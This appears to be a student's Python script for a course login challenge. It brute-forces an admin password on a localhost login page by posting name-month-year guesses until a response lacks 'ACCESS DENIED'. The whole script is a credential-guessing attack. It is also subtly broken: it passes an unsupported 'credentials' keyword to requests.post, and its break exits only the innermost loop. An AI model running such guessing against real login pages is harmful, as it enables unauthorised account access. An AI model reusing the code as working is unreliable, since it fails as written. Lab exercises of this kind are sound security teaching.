# Dylan Ramdhan, CS 357
# Login Authentification: Challenge 2.0

# Importing Requests for the Website
import requests

url = "http://localhost:8080/login"

# Creating password variable
password = ''

### Creating a Nested For Loop to Sift Through to find Password ###

# Names
for names in ['mike', 'jane', 'john', 'mark']:
    
    # Months
    for months in ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']:

        # Iterating through the Range of Years
        for years in range(2023, 1900, -1):
            credentials = {
                'username': 'admin',
                # Password is combined with: [names][months][years]
                'password': names+months+str(years)
            }

            # Requesting to be Tested on the website
            r = requests.post(url, credentials = credentials)

            # Checking to see if ACCESS GRANTED
            if 'ACCESS DENIED' not in r.text:
                password = names+months+str(years)
                break

# Printing out the Password
print(password)